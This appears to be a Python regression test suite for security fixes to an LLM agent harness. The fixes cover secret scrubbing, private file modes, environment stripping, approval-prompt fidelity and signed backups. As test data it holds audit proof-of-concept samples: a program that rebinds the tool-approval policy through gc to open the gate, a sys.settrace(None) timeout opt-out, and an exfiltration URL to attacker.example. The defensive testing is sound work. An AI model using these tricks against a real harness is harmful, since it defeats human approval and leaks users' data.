"""Regression tests for the security-hardening patch (H1-H10).

Each class is the executable form of one finding pair from the two audits
(``.scratch/sec-audit/report-execution.md`` and ``.scratch/sec-audit-b/report-secrets.md``):
the test fails on the pre-patch tree and passes on this one.  Where the auditors' PoC is
reproducible offline it is adapted here rather than re-implemented:

* H1/H3 — ``poc7_secrets.py`` (key at rest, mode 0664) and ``_lab/out/19-env.out``;
* H2   — ``poc7_secrets.py`` (key in the session log and the spill file);
* H4   — ``poc2_policy_and_gate.py`` §1-3 (rebinding ``registry.policy`` from a program);
* H5   — ``poc6_backup.py`` C (a tampered snapshot was a warning, not a refusal);
* H6   — ``poc5_approval.py`` §A (60-char truncation);
* H7   — ``poc3_dos.py`` (settrace opt-out, unbounded output, deleted workspace);
* H8   — ``_lab/out/25-initrace.txt``, ``27-headers.txt``, ``29-userinfo.txt``, F14;
* H9   — the installer had no digest at all;
* H10  — ``poc1_reach.py`` (run_program with no human attached).

Everything is offline and uses the harness's own device seam
(``ios._REAL_SUBPROCESS = False``) to reach the in-process/runpy path Pyto always takes.
"""

from __future__ import annotations

import asyncio
import contextlib
import gc
import hashlib
import io
import json
import os
import stat
import sys
import unittest
import zipfile
from unittest import mock

from harness import doctor, ios, llm, pyto_api, repair, security
from harness.config import Config, ConfigError, describe, load_config, write_sample_config
from harness.errors import error_for_status
from harness.loop import (
    APPROVAL_ARG_CHARS,
    ApprovalRequest,
    LoopOptions,
    auto_prompter,
    make_policy,
    prompter_is_interactive,
    run_turn,
)
from harness.session import SessionLog
from harness.textbudget import truncate_middle
from harness.tools import ToolRegistry
from harness.tools_ios import RUN_CAPTURE_CHARS, _BoundedTextSink, default_context

from .mock_provider import MockProvider, error_response, text_response, tool_response
from .support import ROOT, TempDirTestCase, make_client, make_options

CANARY = "sk-CANARYb7f3a1d9e2c4deadbeef001122334455"


def mode_of(path: str) -> int:
    return stat.S_IMODE(os.stat(path).st_mode)


def drive(options, prompt: str):
    async def go():
        collected = []
        done = {}
        async for event in run_turn(options, prompt):
            collected.append(event)
            if event.kind == "done":
                done = event.data
        return collected, done

    return asyncio.run(go())


def program_registry(case: TempDirTestCase, *, policy=None):
    """A registry whose ``run_program`` takes the in-process path Pyto always takes."""
    original = ios._REAL_SUBPROCESS
    case.addCleanup(setattr, ios, "_REAL_SUBPROCESS", original)
    ios._REAL_SUBPROCESS = False
    registry = case.make_registry()
    registry.policy = policy if policy is not None else make_policy(yolo=True)
    return registry


def call_tool(registry, name, **arguments):
    return asyncio.run(registry.invoke(name, arguments))


# --------------------------------------------------------------------------------------
# H1 — file modes
# --------------------------------------------------------------------------------------


class TestPrivateFileModes(TempDirTestCase):
    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_session_log_and_directory_are_private(self) -> None:
        path = self.path("sessions", "s.jsonl")
        log = SessionLog.create(path, workspace=self.workspace_dir)
        self.addCleanup(log.close)
        self.assertEqual(mode_of(path), 0o600, "the session log holds every prompt and result")
        self.assertEqual(mode_of(os.path.dirname(path)), 0o700)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_resume_tightens_a_loose_log(self) -> None:
        path = self.path("sessions", "s.jsonl")
        log = SessionLog.create(path, workspace=self.workspace_dir)
        log.close()
        os.chmod(path, 0o664)
        resumed = SessionLog.resume(path)
        self.addCleanup(resumed.close)
        self.assertEqual(mode_of(path), 0o600)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_compaction_keeps_the_private_mode(self) -> None:
        path = self.path("sessions", "s.jsonl")
        log = SessionLog.create(path, workspace=self.workspace_dir)
        self.addCleanup(log.close)
        for index in range(20):
            log.append("message.user", {"message": {"role": "user", "content": "x{}".format(index)}})
        self.assertIsNotNone(log.compact(keep_recent=4, force=True))
        self.assertEqual(mode_of(path), 0o600)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_memory_file_is_private(self) -> None:
        registry = self.make_registry()
        result = call_tool(registry, "memory_write", key="note", value="remember this")
        self.assertFalse(result.is_error, result.content)
        path = os.path.join(self.workspace_dir, "memory.json")
        self.assertEqual(mode_of(path), 0o600)
        self.assertEqual(mode_of(self.workspace_dir), 0o700)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_spill_file_is_private(self) -> None:
        spill = self.path("spill")
        result = truncate_middle("z" * 5000, limit=1000, spill_dir=spill, spill_name="tool-x")
        self.assertTrue(result.spill_path)
        self.assertEqual(mode_of(result.spill_path), 0o600, "a spill is the whole untruncated output")
        self.assertEqual(mode_of(spill), 0o700)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_workspace_is_created_private(self) -> None:
        from harness.tools_ios import Workspace

        root = self.path("fresh-workspace")
        Workspace(root)
        self.assertEqual(mode_of(root), 0o700)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_capabilities_cache_is_private(self) -> None:
        state = self.path("state")
        self.assertTrue(pyto_api.save_cache({"pasteboard": {"available": True}}, state))
        self.assertEqual(mode_of(os.path.join(state, "capabilities.json")), 0o600)


class TestDoctorPermissionChecks(TempDirTestCase):
    def make_ctx(self, **overrides):
        config = self.make_config(api_base="http://127.0.0.1:9", api_key=None)
        values = {
            "env": {},
            "config_path": self.path("config.json"),
            "root": ROOT,
            "state": self.path("state"),
            "workspace": self.workspace_dir,
            "sessions_dir": self.path("sessions"),
            "network": False,
            "persist": False,
        }
        values.update(overrides)
        return doctor.DoctorContext.for_config(config, **values)

    def write(self, path, payload, mode):
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(payload, handle)
        os.chmod(path, mode)

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_config_bak_is_reported_and_fixed(self) -> None:
        ctx = self.make_ctx()
        self.write(ctx.config_path, {"api_key": CANARY}, 0o600)
        self.assertEqual(doctor.run_one(ctx, "config_permissions").status, "ok")
        self.write(ctx.config_path + ".bak", {"api_key": CANARY}, 0o664)
        item = doctor.run_one(ctx, "config_permissions")
        self.assertEqual(item.status, "warn")
        self.assertIn(".bak", item.detail)
        outcome = doctor.apply_fix(ctx, "config.chmod", item)
        self.assertTrue(outcome.ok, outcome.error)
        self.assertEqual(mode_of(ctx.config_path + ".bak"), 0o600)
        self.assertEqual(doctor.run_one(ctx, "config_permissions").status, "ok")

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_write_config_creates_a_private_backup(self) -> None:
        ctx = self.make_ctx()
        self.write(ctx.config_path, {"api_key": CANARY, "model": "m"}, 0o600)
        doctor._write_config(ctx, {"api_key": CANARY, "model": "m2"})
        backup = ctx.config_path + ".bak"
        self.assertTrue(os.path.exists(backup))
        self.assertEqual(mode_of(backup), 0o600, "the .bak is a full copy of the key")

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_loose_state_files_are_a_warning_the_fix_repairs(self) -> None:
        ctx = self.make_ctx()
        os.makedirs(ctx.sessions_dir, exist_ok=True)
        os.chmod(ctx.sessions_dir, 0o775)
        log = SessionLog.create(os.path.join(ctx.sessions_dir, "s.jsonl"), workspace=self.workspace_dir)
        log.close()
        os.chmod(os.path.join(ctx.sessions_dir, "s.jsonl"), 0o664)
        item = doctor.run_one(ctx, "file_permissions")
        self.assertEqual(item.status, "warn")
        self.assertIn("s.jsonl", item.detail)
        outcome = doctor.apply_fix(ctx, "permissions.tighten", item)
        self.assertTrue(outcome.ok, outcome.error)
        self.assertEqual(mode_of(ctx.sessions_dir), 0o700)
        self.assertEqual(mode_of(os.path.join(ctx.sessions_dir, "s.jsonl")), 0o600)


# --------------------------------------------------------------------------------------
# H2 — secret scrubbing in the runtime
# --------------------------------------------------------------------------------------


class TestSecretScrubbing(TempDirTestCase):
    def test_shapes_are_scrubbed_not_only_field_names(self) -> None:
        samples = [
            "invalid api key: {}".format(CANARY),
            "authorization: Bearer abcdefghijklmnopqrstuvwxyz",
            '{"api_key": "hunter2-correct-horse"}',
            "api_key=supersecretvalue123",
            "AIzaSy-EXTRA-CANARY-9876543210",
        ]
        for sample in samples:
            with self.subTest(sample=sample):
                cleaned = security.scrub_secrets(sample)
                self.assertNotIn("sk-", cleaned)
                self.assertNotIn("hunter2", cleaned)
                self.assertNotIn("supersecretvalue123", cleaned)
                self.assertNotIn("AIzaSy", cleaned)

    def test_provider_error_body_is_scrubbed(self) -> None:
        exc = error_for_status(401, '{"error": {"message": "invalid api key: %s"}}' % CANARY)
        self.assertNotIn(CANARY, exc.message)
        self.assertIn("<redacted>", exc.message)

    def test_a_401_body_echoing_the_key_never_reaches_the_session_log(self) -> None:
        """Secrets audit F3: a gateway that echoes the credential used to write it to disk."""
        self.make_config(api_key=CANARY)  # registers the value with the scrubber
        session = self.make_session("sessions/e.jsonl")
        script = [error_response(401, "invalid api key: {}".format(CANARY))]
        captured = io.StringIO()
        with MockProvider(script) as provider:
            client = make_client(provider)
            options = make_options(client, self.make_registry(), session)
            with contextlib.redirect_stdout(captured), contextlib.redirect_stderr(captured):
                _events, done = drive(options, "go")
            client.close()
        session.close()
        self.assertEqual(done["stop"], "error")
        with open(session.path, encoding="utf-8") as handle:
            text = handle.read()
        self.assertNotIn(CANARY, text, "the session log kept the key from the error body")
        self.assertNotIn(CANARY, captured.getvalue(), "the console kept the key from the error body")
        self.assertIn("<redacted>", text)

    def test_program_output_with_the_key_leaves_no_trace(self) -> None:
        """PoC 7 A+B: the key must not reach the log, the spill file, the events or stdout."""
        config = self.make_config(api_key=CANARY)
        # Registering the configured value is what makes it scrubbable even when it does
        # not match a known key shape.
        self.assertIn(CANARY, security.known_secrets())
        registry = self.make_registry()
        spill = os.path.join(self.workspace_dir, "tool-output")
        session = self.make_session("sessions/s.jsonl")
        source = "print('key=%s' % '{}' + 'x' * 30000)".format(CANARY)
        script = [tool_response(("run_program", {"path_or_source": source})), text_response("done")]
        captured = io.StringIO()
        with MockProvider(script) as provider:
            client = make_client(provider)
            options = make_options(
                client,
                registry,
                session,
                spill_dir=spill,
                max_tool_result_chars=2000,
                max_turns=3,
            )
            with contextlib.redirect_stdout(captured), contextlib.redirect_stderr(captured):
                # The printer is what writes to the console in a real run.
                from harness.ui import Printer

                printer = Printer(verbose=False)
                options.on_event = printer.handle
                drive(options, "print the key")
            client.close()
        session.close()
        self.assertNotIn(CANARY, captured.getvalue(), "stdout/stderr leaked the key")
        with open(session.path, encoding="utf-8") as handle:
            self.assertNotIn(CANARY, handle.read(), "the session log leaked the key")
        spilled = [os.path.join(spill, name) for name in os.listdir(spill)]
        self.assertTrue(spilled, "the large output should have spilled")
        for path in spilled:
            with open(path, encoding="utf-8") as handle:
                self.assertNotIn(CANARY, handle.read(), "the spill file leaked the key")

    def test_truncate_middle_scrubs_before_spilling(self) -> None:
        result = truncate_middle("a" * 100 + CANARY, limit=50, spill_dir=self.path("spill"))
        self.assertNotIn(CANARY, result.text)
        with open(result.spill_path, encoding="utf-8") as handle:
            self.assertNotIn(CANARY, handle.read())


# --------------------------------------------------------------------------------------
# H3 — child environment
# --------------------------------------------------------------------------------------


class TestChildEnvironment(TempDirTestCase):
    def putenv(self, name: str, value: str) -> None:
        previous = os.environ.get(name)
        os.environ[name] = value
        if previous is None:
            self.addCleanup(os.environ.pop, name, None)
        else:
            self.addCleanup(os.environ.__setitem__, name, previous)

    def test_in_process_program_cannot_see_the_key_and_env_is_restored(self) -> None:
        self.putenv("DEEPSEEK_API_KEY", CANARY)
        self.putenv("SOME_SERVICE_TOKEN", "tok-abcdefghijkl")
        self.putenv("PYTO_HARNESS_SECRET_MARKER", "1")
        registry = program_registry(self)
        source = (
            "import os\n"
            "print('KEY', os.environ.get('DEEPSEEK_API_KEY'))\n"
            "print('TOKEN', os.environ.get('SOME_SERVICE_TOKEN'))\n"
            "print('HARNESS', os.environ.get('PYTO_HARNESS_SECRET_MARKER'))\n"
        )
        result = call_tool(registry, "run_program", path_or_source=source)
        self.assertNotIn(CANARY, result.content)
        self.assertNotIn("tok-abcdefghijkl", result.content)
        self.assertIn("KEY None", result.content)
        self.assertIn("TOKEN None", result.content)
        self.assertIn("HARNESS None", result.content)
        # ... and the harness itself still has them.
        self.assertEqual(os.environ.get("DEEPSEEK_API_KEY"), CANARY)
        self.assertEqual(os.environ.get("SOME_SERVICE_TOKEN"), "tok-abcdefghijkl")
        self.assertEqual(os.environ.get("PYTO_HARNESS_SECRET_MARKER"), "1")

    def test_environment_is_restored_even_when_the_program_raises(self) -> None:
        self.putenv("DEEPSEEK_API_KEY", CANARY)
        registry = program_registry(self)
        result = call_tool(registry, "run_program", path_or_source="raise SystemExit(3)\n")
        self.assertTrue(result.is_error)
        self.assertEqual(os.environ.get("DEEPSEEK_API_KEY"), CANARY)

    def test_subprocess_program_cannot_see_the_key(self) -> None:
        self.putenv("DEEPSEEK_API_KEY", CANARY)
        self.putenv("PYTO_HARNESS_CONFIG", "/tmp/does-not-matter.json")
        original = ios._REAL_SUBPROCESS
        self.addCleanup(setattr, ios, "_REAL_SUBPROCESS", original)
        ios._REAL_SUBPROCESS = True
        registry = self.make_registry()
        registry.policy = make_policy(yolo=True)
        os.makedirs(self.workspace_dir, exist_ok=True)
        with open(os.path.join(self.workspace_dir, "envdump.py"), "w", encoding="utf-8") as handle:
            handle.write(
                "import os\n"
                "print('KEY', os.environ.get('DEEPSEEK_API_KEY'))\n"
                "print('CONF', os.environ.get('PYTO_HARNESS_CONFIG'))\n"
            )
        # A real child process only exists for a *file* path: inline source always takes the
        # in-process path (that is the audit's F1 note about `tools_ios._execute`).
        result = call_tool(registry, "run_program", path_or_source="envdump.py")
        if result.metadata.get("mode") != "subprocess":  # pragma: no cover - no interpreter
            self.skipTest("no real interpreter available for the subprocess path")
        self.assertIn("KEY None", result.content)
        self.assertIn("CONF None", result.content)
        self.assertEqual(os.environ.get("DEEPSEEK_API_KEY"), CANARY)

    def test_doctor_selftest_subprocess_gets_a_scrubbed_environment(self) -> None:
        self.putenv("DEEPSEEK_API_KEY", CANARY)
        ctx = doctor.DoctorContext.for_config(
            self.make_config(),
            env={},
            config_path=self.path("config.json"),
            root=ROOT,
            state=self.path("state"),
            workspace=self.workspace_dir,
            sessions_dir=self.path("sessions"),
            network=False,
            persist=False,
        )
        captured = {}

        class FakeCompleted:
            returncode = 0
            stdout = "Ran 1 test in 0.01s\n\nOK\n"
            stderr = ""

        def fake_run(command, **kwargs):
            captured.update(kwargs)
            return FakeCompleted()

        with mock.patch.object(doctor.ios, "has_fake_subprocess", return_value=False):
            with mock.patch.object(doctor.subprocess, "run", side_effect=fake_run):
                report = doctor.run_offline_tests(ctx, modules=["test_schema"])
        self.assertTrue(report["ok"], report)
        env = captured.get("env") or {}
        self.assertNotIn("DEEPSEEK_API_KEY", env)
        self.assertNotIn(CANARY, json.dumps(env))


# --------------------------------------------------------------------------------------
# H4 — approval policy integrity
# --------------------------------------------------------------------------------------


class TestPolicyIntegrity(TempDirTestCase):
    def test_policy_returning_none_denies(self) -> None:
        registry = ToolRegistry(policy=lambda name, args: None)
        decision = registry.check("share_text", {"text": "x"})
        self.assertFalse(decision.allowed, "a policy that returns None must not open the gate")

    def test_policy_returning_a_truthy_non_bool_denies(self) -> None:
        registry = ToolRegistry(policy=lambda name, args: "yes")
        self.assertFalse(registry.check("share_text", {"text": "x"}).allowed)

    def test_policy_cannot_be_rebound_after_lock(self) -> None:
        registry = ToolRegistry(policy=lambda name, args: False)
        registry.lock_policy()
        with self.assertRaises(AttributeError):
            registry.policy = lambda name, args: True
        self.assertFalse(registry.check("share_text", {"text": "x"}).allowed)

    def test_poc2_program_rebinding_the_policy_does_not_open_the_gate(self) -> None:
        """PoC 2 §1-3: a program patches the live policy; the ASK tool must stay denied."""
        registry = program_registry(self, policy=make_policy(prompter=auto_prompter(False)))
        session = self.make_session()
        client = make_client(MockProvider([text_response("ok")]))
        options = make_options(client, registry, session)  # locks the policy
        self.assertFalse(registry.check("share_text", {"text": "secret"}).allowed)

        mutate = "\n".join(
            [
                "import gc",
                "found = 0",
                "touched = []",
                "for obj in gc.get_objects():",
                "    if obj.__class__.__name__ != 'ToolRegistry':",
                "        continue",
                "    found += 1",
                "    for attr, value in (('policy', (lambda *a: True)),",
                "                         ('_ToolRegistry__policy', (lambda *a: True)),",
                "                         ('_ToolRegistry__sealed', (lambda *a: True))):",
                "        try:",
                "            setattr(obj, attr, value)",
                "            touched.append(attr)",
                "        except Exception as exc:",
                "            touched.append(attr + ':blocked:' + type(exc).__name__)",
                "print('REGISTRIES', found)",
                "print('TOUCHED', touched)",
            ]
        )
        result = call_tool(registry, "run_program", path_or_source=mutate)
        self.assertIn("REGISTRIES", result.content)
        self.assertIn("policy:blocked:AttributeError", result.content)
        client.close()
        session.close()
        decision = registry.check("share_text", {"text": "secret again"})
        self.assertFalse(decision.allowed, "rebinding the policy from a program must not allow the tool")
        self.assertIn("policy", decision.reason.lower())


# --------------------------------------------------------------------------------------
# H5 — backup integrity
# --------------------------------------------------------------------------------------


class TestBackupIntegrity(TempDirTestCase):
    def setUp(self) -> None:
        super().setUp()
        import shutil

        self.root = self.path("copy")
        shutil.copytree(ROOT, self.root, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git", ".scratch"))
        self.backups = self.path("state", "backups")

    def snapshot(self):
        result = repair.snapshot("unit", root=self.root, backups_dir=self.backups)
        self.assertTrue(result.ok, result.reason)
        return result

    def test_round_trip_still_works_and_the_key_is_private(self) -> None:
        snap = self.snapshot()
        key = repair.backup_key_path(self.backups)
        self.assertTrue(os.path.isfile(key))
        if os.name == "posix":
            self.assertEqual(mode_of(key), 0o600)
        self.assertFalse(key.startswith(os.path.abspath(self.backups) + os.sep), "the key must not live in a backup")
        target = os.path.join(self.root, "harness", "config.py")
        with open(target, "a", encoding="utf-8") as handle:
            handle.write("\n# local change\n")
        result = repair.restore(snap.backup_id, root=self.root, backups_dir=self.backups, run_tests=False)
        self.assertTrue(result.ok, result.render())
        with open(target, encoding="utf-8") as handle:
            self.assertNotIn("# local change", handle.read())

    def test_restore_refuses_a_tampered_payload(self) -> None:
        """PoC 6 C: a hash mismatch used to be a warning and the tampered bytes were written."""
        snap = self.snapshot()
        payload = os.path.join(self.backups, snap.backup_id, "harness", "config.py")
        with open(payload, "a", encoding="utf-8") as handle:
            handle.write("\nMARKER = 'tampered'\n")
        target = os.path.join(self.root, "harness", "config.py")
        with open(target, encoding="utf-8") as handle:
            before = handle.read()
        result = repair.restore(snap.backup_id, root=self.root, backups_dir=self.backups, run_tests=False)
        self.assertFalse(result.ok)
        self.assertEqual(result.decision, "refused")
        self.assertIn("REFUSING TO RESTORE", result.reason)
        with open(target, encoding="utf-8") as handle:
            self.assertEqual(handle.read(), before, "nothing may be written on a refusal")

    def test_restore_refuses_an_unsigned_manifest(self) -> None:
        """PoC 6 A/B: a planted backup directory must not be restorable."""
        snap = self.snapshot()
        manifest_path = os.path.join(self.backups, snap.backup_id, "manifest.json")
        with open(manifest_path, encoding="utf-8") as handle:
            manifest = json.load(handle)
        manifest.pop("signature")
        manifest["files"]["harness/repair.py"] = dict(manifest["files"]["harness/config.py"])
        with open(manifest_path, "w", encoding="utf-8") as handle:
            json.dump(manifest, handle)
        result = repair.restore(snap.backup_id, root=self.root, backups_dir=self.backups, run_tests=False)
        self.assertFalse(result.ok)
        self.assertIn("not signed", result.reason)

    def test_restore_refuses_a_modified_manifest(self) -> None:
        snap = self.snapshot()
        manifest_path = os.path.join(self.backups, snap.backup_id, "manifest.json")
        with open(manifest_path, encoding="utf-8") as handle:
            manifest = json.load(handle)
        victim = sorted(manifest["files"])[0]
        manifest["files"][victim]["sha256"] = "0" * 64
        with open(manifest_path, "w", encoding="utf-8") as handle:
            json.dump(manifest, handle)
        result = repair.restore(snap.backup_id, root=self.root, backups_dir=self.backups, run_tests=False)
        self.assertFalse(result.ok)
        self.assertIn("signature does not match", result.reason)

    def test_restore_refuses_a_path_outside_the_safe_set(self) -> None:
        snap = self.snapshot()
        # Sign the manifest again with an extra entry pointing at the tests: a *legitimate*
        # key holder can still not use a restore to write outside the repair jail.
        manifest_path = os.path.join(self.backups, snap.backup_id, "manifest.json")
        with open(manifest_path, encoding="utf-8") as handle:
            manifest = json.load(handle)
        manifest["files"]["tests/test_config.py"] = dict(manifest["files"]["harness/config.py"])
        repair.sign_manifest(manifest, self.backups)
        with open(manifest_path, "w", encoding="utf-8") as handle:
            json.dump(manifest, handle)
        result = repair.restore(snap.backup_id, root=self.root, backups_dir=self.backups, run_tests=False)
        self.assertFalse(result.ok)
        self.assertIn("outside the restorable set", result.reason)


# --------------------------------------------------------------------------------------
# H6 — approval prompt fidelity
# --------------------------------------------------------------------------------------


class TestApprovalPromptFidelity(TempDirTestCase):
    def test_a_500_character_argument_is_shown_in_full(self) -> None:
        payload = "https://attacker.example/collect?d=" + "A" * 460
        request = ApprovalRequest("open_url", {"url": payload}, "leaves this app")
        text = request.describe()
        self.assertIn(payload, text, "the whole payload must be visible to the human")
        self.assertNotIn("more characters", text)

    def test_a_huge_argument_is_cut_with_an_explicit_marker(self) -> None:
        payload = "B" * (APPROVAL_ARG_CHARS + 1234)
        text = ApprovalRequest("share_text", {"text": payload}, "share sheet").describe()
        self.assertIn("…(1234 more characters)", text)
        self.assertIn("B" * 100, text)

    def test_run_program_shows_the_path_and_the_hash_of_the_bytes(self) -> None:
        source = "print('hello')\n"
        inline = ApprovalRequest("run_program", {"path_or_source": source}, "runs code").describe()
        self.assertIn(hashlib.sha256(source.encode("utf-8")).hexdigest(), inline)
        self.assertIn("inline source", inline)

        path = os.path.join(self.workspace_dir, "prog.py")
        os.makedirs(self.workspace_dir, exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(source)
        on_disk = ApprovalRequest("run_program", {"path_or_source": path}, "runs code").describe()
        self.assertIn(os.path.abspath(path), on_disk)
        self.assertIn(hashlib.sha256(source.encode("utf-8")).hexdigest(), on_disk)

        # A relative path is resolved against the workspace the policy was built with.
        relative = ApprovalRequest(
            "run_program", {"path_or_source": "prog.py"}, "runs code", workspace=self.workspace_dir
        ).describe()
        self.assertIn(os.path.abspath(path), relative)
        self.assertIn(hashlib.sha256(source.encode("utf-8")).hexdigest(), relative)

    def test_the_old_sixty_character_cut_is_gone(self) -> None:
        text = ApprovalRequest("open_url", {"url": "x" * 500}, "why").describe()
        self.assertNotIn("x" * 60 + "...", text)


# --------------------------------------------------------------------------------------
# H7 — execution hygiene
# --------------------------------------------------------------------------------------


class TestExecutionHygiene(TempDirTestCase):
    def test_bounded_sink_keeps_at_most_the_cap(self) -> None:
        sink = _BoundedTextSink(100)
        sink.write("a" * 50)
        sink.write("b" * 1000)
        value = sink.value()
        self.assertLessEqual(len(value), 100 + 40)
        self.assertTrue(value.startswith("a" * 50 + "b" * 50))
        self.assertIn("950 more characters", value)
        self.assertEqual(sink.dropped_chars, 950)

    def test_a_chatty_program_does_not_grow_the_result(self) -> None:
        registry = program_registry(self)
        result = call_tool(
            registry, "run_program", path_or_source="print('y' * (4 * 1024 * 1024))"
        )
        self.assertLessEqual(len(result.content), RUN_CAPTURE_CHARS + 200)
        self.assertIn("more characters", result.content)
        self.assertLessEqual(result.metadata["stdout_chars"], RUN_CAPTURE_CHARS + 100)

    def test_settrace_none_reports_that_the_timeout_was_not_enforced(self) -> None:
        """PoC 3 §A: the program opts out of the cooperative timeout."""
        registry = program_registry(self)
        result = call_tool(
            registry,
            "run_program",
            path_or_source="import sys\nsys.settrace(None)\nprint('still here')\n",
        )
        self.assertIn("still here", result.content)
        self.assertFalse(result.metadata["timeout_enforced"])
        self.assertIn("timeout enforced: false", result.content)

    def test_a_normal_program_reports_the_timeout_as_enforced(self) -> None:
        registry = program_registry(self)
        result = call_tool(registry, "run_program", path_or_source="print('quick')\n")
        self.assertTrue(result.metadata["timeout_enforced"])
        self.assertNotIn("timeout enforced: false", result.content)

    def test_a_deleted_workspace_is_a_clean_tool_error(self) -> None:
        """PoC 4 §2: `os.getcwd()` outside the try turned it into a bare traceback."""
        registry = program_registry(self)
        import shutil

        shutil.rmtree(self.workspace_dir)
        result = call_tool(registry, "run_program", path_or_source="print('never runs')")
        self.assertTrue(result.is_error)
        self.assertIn("not usable", result.content)
        self.assertNotIn("Traceback (most recent call last)", result.content)
        os.makedirs(self.workspace_dir, exist_ok=True)

    def test_a_repeated_denied_call_is_not_prompted_again(self) -> None:
        """PoC 5 §E: three identical denials used to ask the human three times."""
        asked = []

        def prompter(request):
            asked.append(request.tool)
            return False

        registry = ToolRegistry(policy=make_policy(prompter=prompter))
        registry.register(
            __import__("harness.tools", fromlist=["ToolDef"]).ToolDef(
                name="share_text", description="d", parameters={"type": "object", "properties": {}}, handler=lambda: "x"
            )
        )
        first = registry.check("share_text", {"text": "same"})
        second = registry.check("share_text", {"text": "same"})
        third = registry.check("share_text", {"text": "same"})
        self.assertFalse(first.allowed)
        self.assertFalse(second.allowed)
        self.assertFalse(third.allowed)
        self.assertEqual(asked, ["share_text"], "the prompt must be asked once")
        self.assertIn("already denied", third.reason)
        self.assertIn("will be denied without asking again", first.reason)
        # A *different* call is a different decision.
        registry.check("share_text", {"text": "different"})
        self.assertEqual(asked, ["share_text", "share_text"])


# --------------------------------------------------------------------------------------
# H8 — config creation and display redaction
# --------------------------------------------------------------------------------------


class TestConfigCreation(TempDirTestCase):
    def test_init_refuses_to_overwrite_and_says_how_to_force(self) -> None:
        path = self.path("config.json")
        write_sample_config(path, api_key="sk-FIRST")
        with self.assertRaises(ConfigError) as caught:
            write_sample_config(path, api_key="sk-SECOND")
        self.assertIn("--force", str(caught.exception))
        with open(path, encoding="utf-8") as handle:
            self.assertIn("sk-FIRST", handle.read(), "an existing config must survive")

    def test_init_force_overwrites(self) -> None:
        path = self.path("config.json")
        write_sample_config(path, api_key="sk-FIRST")
        write_sample_config(path, api_key="sk-SECOND", force=True)
        with open(path, encoding="utf-8") as handle:
            self.assertIn("sk-SECOND", handle.read())

    @unittest.skipUnless(os.name == "posix", "POSIX file modes only")
    def test_init_creates_the_file_0600_exclusively(self) -> None:
        path = self.path("config.json")
        seen = []
        real_open = os.open

        def recording_open(target, flags, mode=0o777):
            seen.append((target, flags, mode))
            return real_open(target, flags, mode)

        with mock.patch.object(os, "open", side_effect=recording_open):
            write_sample_config(path, api_key="sk-REPLACE-ME")
        self.assertTrue(seen, "os.open must be the creation path")
        _target, flags, mode = seen[0]
        self.assertTrue(flags & os.O_CREAT)
        self.assertTrue(flags & os.O_EXCL, "no window in which the file exists world-readable")
        self.assertEqual(mode, 0o600)
        self.assertEqual(mode_of(path), 0o600)

    def test_init_cli_reports_the_real_mode_and_refuses_an_existing_file(self) -> None:
        import run as run_module

        path = self.path("config.json")
        write_sample_config(path, api_key="sk-FIRST")
        previous = os.environ.get("PYTO_HARNESS_CONFIG")
        os.environ["PYTO_HARNESS_CONFIG"] = path
        self.addCleanup(
            lambda: os.environ.__setitem__("PYTO_HARNESS_CONFIG", previous)
            if previous is not None
            else os.environ.pop("PYTO_HARNESS_CONFIG", None)
        )
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = run_module.main(["--init"])
        self.assertEqual(code, 2)
        self.assertIn("already exists", err.getvalue())

        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = run_module.main(["--init", "--force"])
        self.assertEqual(code, 0, err.getvalue())
        self.assertIn("mode 0600", out.getvalue())
        self.assertEqual(mode_of(path), 0o600)

    def test_api_key_on_the_command_line_warns(self) -> None:
        import argparse

        import run as run_module

        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            run_module.warn_about_argv_key(argparse.Namespace(api_key="sk-live-abcdefghij"))
        self.assertIn("ps", err.getvalue())
        self.assertIn("history", err.getvalue())

    def test_plain_http_base_warns_once(self) -> None:
        import run as run_module

        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            run_module.warn_about_plain_http(Config(api_base="http://localhost:8080", api_key="sk-live-abcdefgh"))
        self.assertIn("cleartext", err.getvalue())
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            run_module.warn_about_plain_http(Config(api_base="https://api.deepseek.com", api_key="sk-live-abcdefgh"))
        self.assertEqual(err.getvalue(), "")

    def test_config_file_can_allow_unattended_programs(self) -> None:
        path = self.path("config.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump({"api_key": "sk-x", "allow_unattended_programs": True}, handle)
        config = load_config(config_path=path, env={})
        self.assertTrue(config.allow_unattended_programs)

    def test_secret_headers_and_userinfo_are_redacted(self) -> None:
        headers = llm.redact_headers(
            {"authorization": "Bearer x", "x-goog-api-key": "AIzaSy-SECRET", "content-type": "application/json"}
        )
        self.assertEqual(headers["x-goog-api-key"], "<redacted>")
        self.assertEqual(headers["authorization"], "<redacted>")
        self.assertEqual(headers["content-type"], "application/json")
        text = describe(Config(api_base="https://proxyuser:SUPERSECRETPW@127.0.0.1:1/v1"))
        self.assertNotIn("SUPERSECRETPW", text)
        self.assertIn("<redacted>@127.0.0.1", text)
        preview = llm.LLMClient(
            llm.LLMConfig(api_base="https://user:pw@127.0.0.1:1/v1", model="m", api_key="sk-x")
        ).request_preview([{"role": "user", "content": "hi"}])
        self.assertNotIn("pw@", json.dumps(preview["url"]) + json.dumps(preview["fallback_urls"]))
        self.assertEqual(preview["headers"]["authorization"], "<redacted>")


class TestProviderHostBoundary(TempDirTestCase):
    def test_look_alike_hosts_are_not_deepseek(self) -> None:
        self.assertTrue(doctor._is_deepseek_host("api.deepseek.com"))
        self.assertTrue(doctor._is_deepseek_host("deepseek.com"))
        self.assertFalse(doctor._is_deepseek_host("evil-deepseek.com"))
        self.assertFalse(doctor._is_deepseek_host("notdeepseek.com"))
